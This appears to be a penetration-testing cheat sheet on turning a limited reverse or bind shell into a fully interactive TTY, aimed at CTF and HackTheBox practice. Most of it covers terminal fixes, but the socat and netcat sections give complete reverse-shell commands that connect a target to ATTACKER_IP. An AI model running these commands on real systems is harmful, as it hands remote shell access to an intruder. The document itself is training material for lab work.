# Shell Stabilization Methodology

When exploiting a system during **penetration testing, CTFs, or HackTheBox machines**, the initial shell obtained is usually a **non-interactive shell** (often called a *dumb shell*).

These shells have several limitations:

- No tab completion
- No command history
- No job control (`CTRL+C` may terminate the shell)
- Interactive programs like `vim`, `nano`, `ssh`, `su` may not work
- Terminal formatting issues

Shell stabilization converts a **limited reverse/bind shell into a fully interactive TTY shell**.

---

# Table of Contents

1. Initial Shell Verification
2. Python PTY Spawn
3. Full TTY Upgrade (Best Method)
4. Using `script`
5. Using `socat`
6. Using `rlwrap`
7. Using `expect`
8. Using `perl`
9. BusyBox Shell
10. Fixing Netcat Shell
11. Setting Terminal Environment
12. Fixing Terminal Size
13. Handling CTRL+C Issues
14. Spawning Alternative Shells
15. Checking Available Shells
16. Checking Available Interpreters
17. Quick Stabilization Cheat Sheet

---

# 1. Initial Shell Verification

After gaining a shell, verify the shell type.

```bash
whoami
id
echo $SHELL
tty
````

If the output shows:

```
not a tty
```

You have a **non-interactive shell**.

---

# 2. Python PTY Spawn (Most Common Method)

If Python exists on the target, spawn a **pseudo terminal**.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

or

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This converts the shell into a **basic interactive terminal**.

---

# 3. Full TTY Upgrade (Recommended Method)

This method gives a **fully interactive shell**.

### Step 1 — Spawn PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Step 2 — Background the shell

Press:

```
CTRL + Z
```

### Step 3 — Fix terminal on attacker machine

```bash
stty raw -echo
fg
```

### Step 4 — Reset terminal

```bash
reset
```

### Step 5 — Set terminal environment

```bash
export TERM=xterm
export SHELL=bash
```

### Optional — Fix terminal size

```bash
stty rows 40 columns 120
```

Now the shell supports:

* Tab completion
* Command history
* Interactive tools

---

# 4. Using Script Command

If `script` is installed:

```bash
script /dev/null -c bash
```

or

```bash
script -qc /bin/bash /dev/null
```

This starts a **fully interactive shell session**.

---

# 5. Using Socat (Best Fully Interactive Shell)

If `socat` is available on both machines.

### Attacker Machine

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### Target Machine

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

This creates a **true interactive TTY shell**.

---

# 6. Using rlwrap

Useful when catching shells with **netcat**.

```bash
rlwrap nc -lvnp 4444
```

Benefits:

* Command history
* Arrow key support

---

# 7. Using Expect

If `expect` exists:

```bash
expect -c 'spawn /bin/bash; interact'
```

---

# 8. Using Perl

If Perl is available:

```bash
perl -e 'exec "/bin/bash";'
```

or

```bash
perl -e 'use POSIX; POSIX::setsid(); exec "/bin/bash";'
```

---

# 9. BusyBox Shell

On embedded systems:

```bash
busybox sh
```

---

# 10. Fixing Netcat Shell

Example reverse shell.

### Attacker

```bash
nc -lvnp 4444
```

### Target

```bash
nc ATTACKER_IP 4444 -e /bin/bash
```

After connection upgrade:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

# 11. Setting Terminal Environment

Fix terminal compatibility issues.

```bash
export TERM=xterm
```

---

# 12. Fixing Terminal Size

Some programs break due to incorrect terminal dimensions.

```bash
stty rows 40 columns 120
```

You can find your local terminal size with:

```bash
stty -a
```

---

# 13. Handling CTRL+C Issues

Sometimes `CTRL+C` kills the shell.

Use:

```bash
stty raw -echo
```

or catch the shell with:

```bash
rlwrap nc -lvnp 4444
```

---

# 14. Spawning Alternative Shells

If `/bin/bash` does not exist:

```bash
/bin/sh
/bin/zsh
/bin/dash
/bin/ksh
```

Example:

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

---

# 15. Checking Available Shells

```bash
cat /etc/shells
```

---

# 16. Checking Available Interpreters

Useful for upgrading shells.

```bash
which python
which python3
which perl
which ruby
which lua
```

---

# 17. Quick Stabilization Cheat Sheet

Most commonly used sequence:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo
fg
reset
export TERM=xterm
```

---

# References

* HackTheBox
* PentestMonkey Reverse Shell Cheat Sheet
* Offensive Security Methodologies

